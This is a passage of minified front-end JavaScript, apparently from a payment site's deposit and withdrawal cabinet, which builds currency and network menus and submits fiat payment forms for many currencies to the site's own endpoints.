        "block" == a.style.display || 1 == s ? (a.style.display = "none", a.removeEventListener("click", disBlockEv), "provs_bl1" == t && window.removeEventListener("click", openProvSl)) : (a.style.display = "block", setTimeout((() => {
            a.addEventListener("click", disBlockEv), "provs_bl1" == t && window.addEventListener("click", openProvSl)
        }), 0))
    },
    openDropCur = (e, t, s) => {
        let a = e.parentNode.getElementsByClassName("dropdown__inner")[0];
        if (a) {
            let n = a.getElementsByTagName("ul")[0],
                r = () => {
                    openDropCur(e, t)
                };
            if ("block" == a.style.display) {
                if (n.innerHTML = "", a.style.display = "none", !s) {
                    let e = document.getElementsByClassName("modal_deposite")[0];
                    e && (e.onclick = () => {}), a.onclick = e => {}
                }
            } else {
                a.style.display = "block";
                let e = arrayCurrencyR;
                6 == t && (e = arrayCurrency.concat(arrayCurrencyFiat).filter((e => "CANDY" != e[0]))), 30 == t && (e = arrayCurrencyR.filter((e => "XRP" != e[0]))), fillCurCab(e, t), setTimeout((() => {
                    if (!s) {
                        let e = document.getElementsByClassName("modal_deposite")[0];
                        e && (e.onclick = () => {
                            r()
                        }), a.onclick = e => {
                            disBlockEv(e)
                        }
                    }
                }), 100)
            }
        }
    },
    fillCurCab = (e, t) => {
        let s;
        s = document.getElementsByClassName("dep_list_cur" + t)[0], s.innerHTML = "", e.forEach((e => {
            let a = 2 == t || 1 == t || 4 == t || 7 == t || 8 == t || 6 == t ? `<span data-v-5efd4718="" class="coin_label">${e[1]}</span>` : "",
                n = 2 == t || 1 == t || 4 == t || 7 == t || 8 == t || 6 == t ? "style='margin-left: auto;margin-right: 10px;'" : "";
            s.innerHTML += `\n    <li onclick='cabChooseCur("${e[0]}",${t})' class="cab_cur_${e[0]}1" data-v-5efd4718="" tabindex="2"><img loading="lazy" data-v-5efd4718="" width="24" height="24" src="/assets/coins/${e[0]}.svg" \n    alt="${e[0]}" class="">${a}<span data-v-5efd4718="" ${n} class="coin_label">${e[0]}</span></li>`
        }))
    },
    cabChooseNs = (e, t, s) => {
        let a = "dep_list_ns" + t,
            n = document.getElementsByClassName(a)[0],
            r = n.getElementsByClassName("vmi_" + e)[0];
        n = n.getElementsByClassName("vmi571"), r.classList.contains("active") || (Array.from(n).forEach((e => e.classList.remove("active"))), r.classList.add("active"), 1 == t && getAdrDep(s, e), 3 == t && getAdrList(s, e, 3), 2 == t && getAdrList(s, e, 2), networkLast = e)
    },
    cabChooseCur = async (e, t) => {
        let s;
        s = "dep_trigger" + t;
        let a = document.getElementsByClassName(s)[0],
            n = a.getElementsByTagName("span")[0];
        if (n.innerHTML != e) {
            let s = arrNetworkCrypto;
            n = a.getElementsByTagName("img")[0], n.setAttribute("src", `/assets/coins/${e}.svg`), n.setAttribute("alt", e), n = a.getElementsByTagName("span")[0], n.innerHTML = e, 7 != t && 8 != t && 2 != t && 1 != t && openDropCur(a, t);
            let r = s.findIndex((t => e == t.name));
            if (currencyLast = e, -1 != r && 6 != t && 4 != t) {
                let a = "dep_list_ns" + t;
                cwr = document.getElementsByClassName(a)[0], cwr && (cwr.style.display = "grid"), 1 == t && cwr && (cwr.style.display = "flex"), cwr = document.getElementsByClassName("d_l_w" + t)[0], cwr && cwr.classList.add("active");
                let n = document.getElementsByClassName("dep_list_ns" + t)[0];
                n.innerHTML = "", s[r].ns.forEach((s => {
                    n.innerHTML += `\n        <button onclick="cabChooseNs('${s}',${t},'${e}')" data-cur="${e}" class="vmi571 vmi_${s}"  type="button">${s}</button>`
                })), networkLast = s[r].ns[0], networkLast && cabChooseNs(networkLast, t, currencyLast)
            } else {
                let s = "dep_list_ns" + t,
                    a = document.getElementsByClassName(s)[0];
                a && (a.style.display = "none"), 1 == t && getAdrDep(e, ""), 3 == t && getAdrList(e, "", 3), 2 == t && getAdrList(e, "", 2), a = document.getElementsByClassName("d_l_w" + t)[0], a && a.classList.remove("active")
            }
            4 == t && getSetSwap(e), 7 != t && 8 != t || setPaysFiat(e, t)
        } else openDropCur(a, t);
        if (6 == t && await getBalanceUser(e, 2), 2 != t && 1 != t && 4 != t && 7 != t && 8 != t || await getBalanceUser(e, 1, t), 30 == t) {
            let t = document.getElementsByClassName("b_cr_n");
            Array.from(t).forEach((t => t.innerHTML = e))
        }
    };
setPaysCurrency = "";
let setPaysFiat = (e, t) => {
        if (setPaysCurrency = e, 7 == t) {
            opDData(!1);
            let t = document.getElementsByClassName("list_fiat_dep");
            Array.from(t).forEach((e => e.style.display = "none")), t = document.getElementsByClassName("list_f_" + e)[0], t && (t.style.display = "grid"), t = document.getElementsByClassName("extra_parFFF"), Array.from(t).forEach((e => e.style.display = "none")), t = document.getElementsByClassName("extra_par_" + e)[0], t && (t.style.display = "block"), createBtnPays();
            let s = depwith[setPaysCurrency];
            if (null == s) return;
            let a = document.getElementsByClassName("amountFiatDep456")[0];
            return a.value = "", a.classList.remove("err756"), a.dataset.count = s.in[0], a.dataset.countMax = s.in[1], a.dataset.depCount = 1, void(a.dataset.name = setPaysCurrency)
        }
        if (8 == t) {
            opWData(!1);
            let t = document.getElementsByClassName("list_fiat_with");
            Array.from(t).forEach((e => e.style.display = "none")), t = document.getElementsByClassName("list_w_" + e)[0], t && (t.style.display = "grid"), t = document.getElementsByClassName("fi_fiat_with"), Array.from(t).forEach((e => e.style.display = "none")), t = document.getElementsByClassName("list_wf_" + e), Array.from(t).forEach((e => e.style.display = "block"));
            let s = depwith[setPaysCurrency];
            if (null == s) return;
            let a = document.getElementsByClassName("with_min117F")[0];
            a.dataset.count = s.out[0], a.dataset.countMax = s.out[1], a.dataset.name = setPaysCurrency, a.innerHTML = s.out[0] + " " + setPaysCurrency, a = document.getElementById("mwd_fiat_6"), a.innerHTML = s.out[1] + " " + setPaysCurrency, a = document.getElementsByClassName("with_fee117F")[0], "RUB" == setPaysCurrency || "INR" == setPaysCurrency ? a.innerHTML = s.out_fee_proc + "% " : (a.innerHTML = Number(s.out_fee) > 0 ? s.out_fee : "0", a.innerHTML += " " + setPaysCurrency)
        }
    },
    changeWithFiat = e => {
        let t, s, a = gC("modal_dep_withdraw")[0].style.display;
        if (t = Number(e.value), s = t / Number(listCurs.data.rates[setPaysCurrency]), t = t < 0 ? 0 : window.truncatorJet(t, 2, 2) - 0, s = window.truncatorJet(s, 2, 2) - 0, gD("cur_wds9").innerHTML = t + " ", gD("lci_wd9").innerHTML = s, "none" != a && "" != a)
            if ("RUB" == setPaysCurrency) {
                let t = Number(e.value) - Number(e.value) * Number(depwith[setPaysCurrency].out_fee_proc) / 100 - Number(depwith[setPaysCurrency].out_fee);
                gC("with_pay117F")[0].innerHTML = t < 0 ? 0 : window.truncatorJet(t, 8)
            } else {
                let t = Number(e.value) - Number(depwith[setPaysCurrency].out_fee);
                gC("with_pay117F")[0].innerHTML = t < 0 ? 0 : window.truncatorJet(t, 8)
            }
    };

function changeCardNumber(e) {
    let t = e.currentTarget.value,
        s = e.which || e.keyCode || e.charCode;
    t = t.replace(/\D+/g, ""), t = t.replace(/(\d{4})/g, "$1 "), 8 == s && " " == t[t.length - 1] && (t = t.slice(0, -1)), e.currentTarget.value = t
}
let depRset, chFDV7 = (e, t) => (1 == t && (e = e.replaceAll(/( |<([^>]+)>)/gi, "")), 2 == t && (e = e.replaceAll(/( |<([^>]+)>)/gi, " ")), e),
    stWidh555 = 0,
    sendWithFiat = (e, t = 0) => {
        if (1 == stWidh555) return;
        let s, a, n = new FormData,
            r = 1,
            o = [];
        if (t && (t.disabled = !0), stWidh555 = 1, "CAD" == setPaysCurrency && (s = document.getElementById("cad_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("cad_w_phone"), o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("cad_name"), o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("cad_surname"), o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("cad_w_email"), o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), n.set("phone", o[1].val), n.set("name", o[2].val), n.set("surname", o[3].val), n.set("email", o[4].val), n.set("method", "interac")), "UAH" == setPaysCurrency && (s = document.getElementById("uah_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("uah_w_card"), o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), n.set("account_number", o[1].val), a = document.getElementById("uah_w_name"), o.push({
                val: a.value,
                obj: a
            }), n.set("holder", o[2].val), n.set("direct", "payco_uah_vm"), n.set("method", "payco")), "EUR" == setPaysCurrency && (s = document.getElementById("EUR1_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("eur_c_acn"), o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("eur_ben"), o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), n.set("account_number", o[1].val), n.set("name", o[2].val), n.set("method", "nhub")), "AUD" != setPaysCurrency && "NZD" != setPaysCurrency || (s = document.getElementById("nzd_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("nzd_acn"), o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), n.set("account_number", o[1].val), n.set("method", "astro")), "NGN" == setPaysCurrency && (s = document.getElementById("ngn_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("ngn_w_acnum"), o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("ngn_w_baco"), o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), n.set("account_number", o[1].val), n.set("bank_code", o[2].val.split("&&")[1]), n.set("bank_name", o[2].val.split("&&")[0]), n.set("method", "nfg"), n.set("payment_method", "bank")), "KZT" == setPaysCurrency && (s = document.getElementById("kzt_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("kzt_w_card"), o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), n.set("address", o[1].val), n.set("method", "pm")), "AZN" == setPaysCurrency) {
            s = document.getElementById("azn_amount"), a = s, o.push({
                val: a.value,
                obj: a
            });
            let e = document.getElementById("img_wit_f77");
            "eex" == e.dataset.a ? (a = document.getElementById("azn_p_card"), o.push({
                val: a.value,
                obj: a
            })) : (a = document.getElementById("azn_w_card"), o.push({
                val: a.value,
                obj: a
            })), n.set("amount", Number(o[0].val)), n.set("account_number", o[1].val), "eex" == e.dataset.a ? n.set("method", "eex") : n.set("method", "deca")
        }
        if ("INR" == setPaysCurrency) {
            a = document.getElementById("img_wit_f77");
            let e = a.getAttribute("alt");
            s = document.getElementById("inr_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val));
            let t = "paytm";
            "Imps" == e ? (a = document.getElementById("inr_c_phonumb"), o.push({
                val: a.value,
                obj: a
            }), n.set("account_number", o[1].val), t = "imps", a = document.getElementById("inr_c_accname"), o.push({
                val: a.value,
                obj: a
            }), n.set("account_name", o[2].val), a = document.getElementById("inr_c_acifsc"), o.push({
                val: a.value,
                obj: a
            }), n.set("bank_code", o[3].val)) : (a = document.getElementById("inr_c_accnumb"), o.push({
                val: a.value,
                obj: a
            }), n.set("account_number", o[1].val)), n.set("payment_method", t), n.set("method", "kasma")
        }
        if ("BDT" == setPaysCurrency) {
            s = document.getElementById("bdt_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), a = document.getElementById("img_wit_f77");
            let e = a.dataset.a,
                t = a.dataset.b;
            a = document.getElementById("bdt_c_accnumb"), o.push({
                val: a.value,
                obj: a
            }), n.set("account_number", o[1].val), "P2P" == e ? (n.set("payment_method", t), n.set("method", "kasma")) : (n.set("payment_method", e), n.set("method", "apay")), "bkash" != t && "P2P" == e || (a = document.getElementById("bdt_c_email"), o.push({
                val: a.value,
                obj: a
            }), n.set("email", o[2].val))
        }
        if ("KES" == setPaysCurrency && (s = document.getElementById("kes_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), a = document.getElementById("kes_c_accnumb"), o.push({
                val: a.value,
                obj: a
            }), n.set("account_number", o[1].val), n.set("payment_method", "mpesa"), n.set("method", "kasma")), "PHP" == setPaysCurrency) {
            s = document.getElementById("php_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), a = document.getElementById("php_w_name"), o.push({
                val: a.value,
                obj: a
            }), n.set("holder", o[1].val), a = document.getElementById("img_wit_f77");
            let e = a.getAttribute("alt");
            e = chFDV7(e, 1), n.set("bank_code", e), e = "GCASH" == e ? "php_w_accumg" : "php_w_accum", a = document.getElementById(e), o.push({
                val: a.value,
                obj: a
            }), n.set("account_number", o[2].val), n.set("method", "leo")
        }
        if ("IDR" == setPaysCurrency && (n.set("method", "inter"), s = document.getElementById("idr_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("idr_w_card"), o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("fn_w_idr"), o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("ln_w_idr"), o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("b6_" + setPaysCurrency), o.push({
                val: chFDV7(a.dataset.id, 1),
                obj: a
            }), n.set("amount", Number(o[0].val)), n.set("bank_account", o[1].val), n.set("first_name", o[2].val), n.set("last_name", o[3].val), n.set("pay_method", o[4].val)), "RUB" == setPaysCurrency) {
            let e = document.getElementById("img_wit_f77");
            s = document.getElementById("rub_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), "2" != e.dataset.a && "aifo" != e.dataset.a && (a = document.getElementById("rub_w_card"), o.push({
                val: a.value,
                obj: a
            }), a = document.getElementById("rub_name"), o.push({
                val: a.value,
                obj: a
            }), n.set("address", o[1].val), n.set("holder", o[2].val), n.set("method", "payco")), "aifo" == e.dataset.a && (a = document.getElementById("rub_w_card"), o.push({
                val: a.value,
                obj: a
            }), n.set("account_number", o[1].val), n.set("method", "aifory"))
        }
        if ("TRY" == setPaysCurrency) {
            s = document.getElementById("try_amount"), a = s, o.push({
                val: a.value,
                obj: a
            }), n.set("amount", Number(o[0].val)), a = document.getElementById("img_wit_f77");
            let e = a.getAttribute("alt");
            "BANK TRANSFER" == e && (e = "TRANSFER"), a = document.getElementById("try_name"), o.push({
                val: a.value,
                obj: a
            }), n.set("name", o[1].val), a = document.getElementById("try_surname"), o.push({
                val: a.value,
                obj: a
            }), n.set("surname", o[2].val), "EFTFAST" == e || "TRANSFER" == e ? (a = document.getElementById("try_hesap_nu2"), o.push({
                val: a.value,
                obj: a
            }), n.set("bank_id", o[3].val), a = document.getElementById("try_ib2"), o.push({
                val: a.value,
                obj: a
            }), n.set("bank_iban", o[4].val)) : (a = document.getElementById("try_wallet_number"), o.push({
                val: a.value,
                obj: a
            }), n.set("bank_iban", o[3].val)), n.set("payment_method", e), n.set("method", "scash")
        }
        "BRL" == setPaysCurrency && (s = document.getElementById("pix_amount"), a = s, o.push({
            val: a.value,
            obj: a
        }), a = document.getElementById("pix_name"), o.push({
            val: a.value,
            obj: a
        }), a = document.getElementById("pix_document_id"), o.push({
            val: a.value,
            obj: a
        }), user_creds || (user_creds = {}), user_creds.w = user_creds.w || {}, user_creds.w.pix = user_creds.w.pix || {}, user_creds.w.pix.document_id = a.value, a = document.getElementById("pix_document_type"), o.push({
            val: chFDV7(a.innerHTML, 1),
            obj: a.parentNode
        }), user_creds.w.pix.document_type = chFDV7(a.innerHTML, 1), a = document.getElementById("pix_account"), o.push({
            val: a.value,
            obj: a
        }), a = document.getElementById("pix_account_type"), o.push({
            val: chFDV7(a.innerHTML, 1),
            obj: a.parentNode
        }), n.set("amount", Number(o[0].val)), n.set("name", o[1].val), n.set("document_id", o[2].val), n.set("document_type", o[3].val), n.set("account", o[4].val), n.set("account_type", o[5].val), n.set("method_inner", "PIX"), n.set("country", "BRA"), n.set("method", "smile")), "CLP" == setPaysCurrency && (s = document.getElementById("clp_amount"), a = s, o.push({
            val: a.value,
            obj: a
        }), a = document.getElementById("clp_email"), o.push({
            val: a.value,
            obj: a
        }), a = document.getElementById("b7_CLP"), o.push({
            val: chFDV7(a.dataset.id, 1),
            obj: a
        }), a = document.getElementById("clp_rut"), o.push({
            val: a.value,
            obj: a
        }), a = document.getElementById("clp_name"), o.push({
            val: a.value,
            obj: a
        }), a = document.getElementById("b6_CLP"), o.push({
            val: chFDV7(a.dataset.id, 1),
            obj: a
        }), a = document.getElementById("clp_num"), o.push({
            val: a.value,
            obj: a
        }), a = document.getElementById("clp_phone"), o.push({
            val: a.value,
            obj: a
        }), n.set("amount", Number(o[0].val)), n.set("email", o[1].val), n.set("account_bank_sbif", o[2].val), n.set("account_bank_rut", o[3].val), n.set("account_bank_name", o[4].val), n.set("account_bank_type", o[5].val), n.set("account_bank_num", o[6].val), n.set("phone", o[7].val), a = gD("img_wit_f77"), a = a.dataset.a, "payku" != a ? (n.set("direct", a), n.set("method", "payco")) : n.set("method", "payku")), n.set("typepay", setPaysCurrency), e && n.set("user_code", e), "" != s.value && NaN != s.value && null != s.value || createNotifyL(1, lp["Enter the debit amount"], lp.Error), o.forEach((e => {
            if ("" == e.val || NaN == e || null == e) return createNotifyL(1, lp["Not all fields"], lp.Error), r = 2, t && (t.disabled = !1), NaN != e && null != e && e.obj.classList.add("err756"), void(stWidh555 = 0)
        })), 1 == r && (o.forEach((e => {
            NaN != e && null != e && e.obj.classList.remove("err756")
        })), axios({
            method: "post",
            url: "/withdraw/index.php",
            data: n,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).then((function(e) {
            t && (t.disabled = !1), stWidh555 = 0, 0 == e.data.error ? (s.value = "", document.getElementById("with_inp_fiat").innerHTML = window.truncatorJet(Number(e.data.amount), 8), upMoneyCoins([
                [setPaysCurrency, e.data.amount]
            ]), 1 == stBal0 && (getCurs0(2), getCurs0(1)), 1 == stBalUsd && (getUSD(2), getUSD(1)), createNotifyL(2, e.data.message, lp.Success)) : 2 == e.data.error ? ask2FA() : createNotifyL(1, e.data.message, lp.Error)
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        })))
    },
    chInpD56 = e => {
        "" != e.value && (Number(e.value) < Number(e.dataset.count) || Number(e.value) > Number(e.dataset.countMax)) ? e.classList.add("err756") : e.classList.remove("err756");
        let t = document.getElementsByClassName("dep_min234")[0],
            s = document.getElementsByClassName("dep_max234")[0];
        "" != e.value && Number(e.value) < Number(e.dataset.count) ? t.classList.add("err756") : t.classList.remove("err756"), "" != e.value && Number(e.value) > Number(e.dataset.countMax) ? s.classList.add("err756") : s.classList.remove("err756"), "RUB" == setPaysCurrency && (e.value = e.value.replace(/\D+/g, ""));
        let a = gD("amountFiatExt"),
            n = gC("amountFiatET"),
            r = 0;
        0 != chBoI.min && Number(chBoI.min) * listCurs.data.rates[setPaysCurrency] < Number(e.value) ? (a && (a.style.display = "block", r = "0" == chBoI.amo ? chBoI.am : Number(chBoI.amo) * Number(e.value) / 100, "0" != chBoI.amo && (r = Number(r).toFixed(2) + " " + setPaysCurrency), a.innerHTML = "Extra: " + r), Array.from(n).forEach((e => {
            e.style.display = "flex";
            let t = e.getElementsByTagName("span");
            t[0] && (t[0].innerHTML = chBoI.am), r = Number(chBoI.min) * listCurs.data.rates[setPaysCurrency], r = Number(r).toFixed(2), t[1] && (t[1].innerHTML = r + " " + setPaysCurrency)
        }))) : (a.style.display = "none", Array.from(n).forEach((e => {
            e.style.display = "none"
        })))
    },
    openUahSt = async e => {
        if (0 == e.error) {
            let t = document.getElementById("coins_preloadOpen");
            t.style.display = "";
            let s = document.getElementById("amountFiatDep").value,
                a = document.getElementsByClassName("extra_par_UAH_e")[0];
            a.style.display = "block", a = document.getElementsByClassName("fiat_dep_m4")[0], a.style.display = "none", a = document.getElementsByClassName("extra_par_UAH")[0], a.style.display = "none", a = document.getElementById("uah_e_address1"), a.value = e.card, a = document.getElementById("uah_e_address"), a.value = e.card, a.setAttribute("size", a.value.length), a = document.getElementById("uah_e_amount"), a.value = s + " UAH", a.setAttribute("size", a.value.length), a = document.getElementById("uah_e_amount1"), a.value = s, a = document.getElementsByClassName("uah_e_img")[0], a.setAttribute("src", document.getElementById("img_dep_f77").getAttribute("src")), a = document.getElementsByClassName("uah_e_plat")[0], a.classList.add("uah_" + exrPageDep), a = document.getElementsByClassName("uah_e_namesb")[0], s = document.getElementById("mwd_fiat1"), a.innerHTML = s.innerHTML, t = document.getElementById("btnDep111"), t && (t.disabled = !1)
        } else createNotifyL(1, e.message, lp.Error)
    }, exrPageDep = 0, openDepExtraI = async e => {
        let t = new FormData,
            a = document.getElementById("amountFiatDep").value;
        t.set("amount", Number(a)), t.set("currency", setPaysCurrency);
        let n = "";
        if ("RUB" == setPaysCurrency && (n = "/deposit/paycos/indexh2h.php", t.set("method", exrPageDep)), "UAH" == setPaysCurrency) {
            t.set("payment_method", exrPageDep);
            let e = document.getElementById("uah_nameF");
            t.set("fname", e.value), e = document.getElementById("uah_surnameF"), t.set("lname", e.value), document.getElementById("coins_preloadOpen").style.display = "flex"
        }
        e && (e.disabled = !0);
        let r = await axios({
            method: "post",
            url: n,
            data: t,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
        if (0 == r.data.error) {
            if ("UAH" == setPaysCurrency) return;
            let e = document.getElementsByClassName("extra_par_RUB_e")[0];
            e.style.display = "block", e = document.getElementsByClassName("fiat_dep_m4")[0], e.style.display = "none";
            let t = {
                    cur_time: r.data.time,
                    date_end: r.data.time + 60 * r.data.lifetime
                },
                a = 0,
                n = e => {
                    let n = e,
                        r = t.cur_time;
                    a += 1;
                    let o = n - (r + a);
                    o > 0 ? (day = "0" + Math.floor(o / 86400), h = "0" + Math.floor((o - 86400 * day) / 3600), m = "0" + Math.floor((o - 86400 * day - 3600 * h) / 60), s = "0" + Math.floor(o - 86400 * day - 3600 * h - 60 * m)) : (m = s = "00", clearInterval(depRset)), document.getElementById("torr_m").innerHTML = m.substr(-2), document.getElementById("torr_s").innerHTML = s.substr(-2)
                };
            n(t.date_end), depRset = setInterval((() => {
                n(t.date_end)
            }), 1e3), e = document.getElementById("rub_e_address1"), e.value = "" == r.data.phone ? r.data.number : r.data.phone, e = document.getElementById("rub_e_address"), e.value = "" == r.data.phone ? r.data.number.replace(/(\d{4})/g, "$1 ") : r.data.phone, e.setAttribute("size", e.value.length), e = document.getElementById("rub_e_amount"), e.value = r.data.amount + " RUB", e.setAttribute("size", e.value.length), e = document.getElementById("rub_e_amount1"), e.value = r.data.amount, e = document.getElementsByClassName("rub_e_img")[0], e.setAttribute("src", document.getElementById("img_dep_f77").getAttribute("src")), e = document.getElementsByClassName("rub_e_plat")[0], e.classList.add("rub_" + exrPageDep), e = document.getElementById("rub_e_nc"), e.style.display = "" != r.data.phone ? "none" : "block", e = document.getElementById("rub_e_np"), e.style.display = "" == r.data.phone ? "none" : "block", e = document.getElementsByClassName("rub_e_img")[0], e.style.display = "" != r.data.phone ? "none" : "block", e = document.getElementsByClassName("rub_e_namesb")[0], e.style.display = "" == r.data.phone ? "none" : "block", e.innerHTML = r.data.bank_name
        } else createNotifyL(1, r.data.message, lp.Error);
        e && (e.disabled = !1)
    }, stFiD555 = 0, sendFiatDep = async (e = 0) => {
        if (1 == stFiD555) return;
        e && (e.disabled = !0), stFiD555 = 1;
        let t, s, a = 0,
            n = 0,
            r = document.getElementById("amountFiatDep"),
            o = 1,
            i = [];
        if (t = r.value, "ALL" != setPaysCurrency) {
            let s = "" == t || NaN == t || null == t,
                a = Number(t) <= 0 || Number(t) < Number(r.dataset.count) || Number(t) > Number(r.dataset.countMax);
            (s || a) && (s && createNotifyL(1, lp["Enter the debit amount"], lp.Error), a && createNotifyL(1, `Limit: ${r.dataset.count} ${setPaysCurrency} / ${r.dataset.countMax} ${setPaysCurrency}`, lp.Error), stFiD555 = 0, e && (e.disabled = !1), r.classList.add("err756"), o = 2)
        }
        let l = new FormData;
        l.set("amount", Number(t));
        let c = "";
        if ("UAH" == setPaysCurrency && (c = "/deposit/paycos/index.php", l.set("method", "payco_uah_vm"), l.set("currency", setPaysCurrency)), "IDR" == setPaysCurrency) {
            let s = gD("img_dep_f77").dataset.a;
            if ("undefined" == s) return window.open(`/deposit/inter/index.php?currency=${setPaysCurrency}&amount=${Number(t)}`, "_blank"), stFiD555 = 0, void(e && (e.disabled = !1));
            s = chFDV7(s, 2), c = "/deposit/paycos/index.php", l.set("method", s), l.set("currency", setPaysCurrency)
        }
        if ("THB" == setPaysCurrency || "MYR" == setPaysCurrency || "GEL" == setPaysCurrency || "UZS" == setPaysCurrency || "JPY" == setPaysCurrency || "CNY" == setPaysCurrency) {
            let e = gD("img_dep_f77").dataset.a;
            e = chFDV7(e, 2), c = "/deposit/paycos/index.php", l.set("method", e), l.set("currency", setPaysCurrency)
        }
        if ("PHP" == setPaysCurrency) {
            let e = chFDV7(document.getElementById("img_dep_f77").getAttribute("alt"), 2);
            c = "/deposit/leo/index.php", e = "GCASH" == e ? "GCASH_NATIVE" : "MAYA_NATIVE", l.set("payment_method", e), l.set("currency", setPaysCurrency);
            let t = document.getElementById("php_fname1");
            i.push({
                val: t.value,
                obj: t
            }), t = document.getElementById("php_lname1"), i.push({
                val: t.value,
                obj: t
            }), l.set("fname", i[0].val), l.set("lname", i[1].val), n = 1
        }
        if ("ALL" == setPaysCurrency) return window.open("/deposit/skinpay/index.php", "_blank"), stFiD555 = 0, void(e && (e.disabled = !1));
        if ("INR" == setPaysCurrency) {
            let e = chFDV7(document.getElementById("img_dep_f77").getAttribute("alt"), 2),
                t = "";
            "UPI" == e && (t = "upi"), "UPI Fast" == e && (t = "upi_s"), "PayTM" == e && (t = "paytm"), "PhonePe" == e && (t = "phone_pe"), c = "/deposit/kasma/index.php", l.set("method", t), a = 1, l.set("currency", setPaysCurrency)
        }
        if ("KZT" == setPaysCurrency && (c = "/deposit/pm/index.php", l.set("currency", setPaysCurrency)), "AZN" == setPaysCurrency) {
            let e = document.getElementById("img_dep_f77");
            l.set("currency", setPaysCurrency), "eex" == e.dataset.a ? c = "/deposit/eex/index.php" : (c = "/deposit/deca/index.php", l.set("payment_method", "card_transfer")), n = 1
        }
        if ("BDT" == setPaysCurrency) {
            let e = document.getElementById("img_dep_f77");
            "P2P" == e.dataset.a ? (c = "/deposit/kasma/index.php", e = chFDV7(document.getElementById("img_dep_f77").dataset.b, 2), l.set("method", e)) : (e = chFDV7(document.getElementById("img_dep_f77").dataset.a, 2), l.set("method", e), c = "/deposit/apay/index.php", s = document.getElementById("bdt_accN1"), i.push({
                val: s.value,
                obj: s
            }), l.set("account_number", i[0].val)), l.set("currency", setPaysCurrency), a = 1
        }
        if ("KES" == setPaysCurrency && (c = "/deposit/kasma/index.php", l.set("currency", setPaysCurrency), l.set("method", "mpesa"), a = 1), "NGN" == setPaysCurrency) {
            c = "/deposit/niger/index.php", l.set("currency", setPaysCurrency), "Card" == chFDV7(document.getElementById("img_dep_f77").getAttribute("alt"), 2) ? (s = document.getElementById("ngn_c_email"), i.push({
                val: s.value,
                obj: s
            }), l.set("email", i[0].val), s = document.getElementById("ngn_c_pan"), i.push({
                val: s.value,
                obj: s
            }), l.set("pan", i[1].val), s = document.getElementById("ngn_c_exp"), i.push({
                val: s.value,
                obj: s
            }), s = document.getElementById("ngn_c_exp_y"), i.push({
                val: s.value,
                obj: s
            }), l.set("expiration", i[2].val + "/" + i[3].val), s = document.getElementById("ngn_c_cvv"), i.push({
                val: s.value,
                obj: s
            }), l.set("cvv", i[4].val), l.set("method", "n_card")) : l.set("method", "n_bank")
        }
        if ("EUR" == setPaysCurrency && (c = "/deposit/nhub/index.php", l.set("currency", setPaysCurrency), a = 3), "AUD" != setPaysCurrency && "NZD" != setPaysCurrency || (c = "/deposit/astropay/index.php", l.set("currency", setPaysCurrency), a = 3), "CAD" == setPaysCurrency && (c = "/deposit/interac/index.php", l.set("currency", setPaysCurrency), s = document.getElementById("cad_phone_extr"), i.push({
                val: s.value,
                obj: s
            }), l.set("phone", i[0].val), l.set("method", "interac-cpi")), "RUB" == setPaysCurrency) {
            let e = document.getElementById("img_dep_f77");
            if ("visamc_p2p" == e.dataset.a);
            else if ("aifo" == e.dataset.a) c = "/deposit/aifory/index.php", l.set("currency", setPaysCurrency);
            else {
                e = chFDV7(e.getAttribute("alt"), 2), c = "/deposit/paycos/index.php";
                let t = "payco";
                "SBP" == e && (t = "payco_sbp"), l.set("method", t)
            }
        }
        if ("TRY" == setPaysCurrency) {
            let e = document.getElementById("img_dep_f77");
            if (e.dataset.a) {
                let e = gD("img_dep_f77").dataset.a;
                e = chFDV7(e, 2), c = "/deposit/paycos/index.php", l.set("method", e), l.set("currency", setPaysCurrency)
            } else s = document.getElementById("try_nameF"), i.push({
                val: s.value,
                obj: s
            }), l.set("firstname", i[0].val), s = document.getElementById("try_surnameF"), i.push({
                val: s.value,
                obj: s
            }), l.set("lastname", i[1].val), l.set("token", e.dataset.t), "CREDITCARD" != e.dataset.m ? (s = document.getElementById("try_hesap_nu"), i.push({
                val: s.value,
                obj: s
            }), l.set("bankId", s.dataset.u), l.set("other", document.getElementById("terms32").checked)) : (s = document.getElementById("try_c_name"), i.push({
                val: s.value,
                obj: s
            }), l.set("cardHolder", i[2].val), s = document.getElementById("try_c_pan"), i.push({
                val: s.value,
                obj: s
            }), l.set("cardNumber", i[3].val), s = document.getElementById("try_c_cvv"), i.push({
                val: s.value,
                obj: s
            }), l.set("cvv", i[4].val), s = document.getElementById("try_c_exp"), i.push({
                val: s.value,
                obj: s
            }), l.set("expiration_MM", i[5].val), s = document.getElementById("try_c_exp_y"), i.push({
                val: s.value,
                obj: s
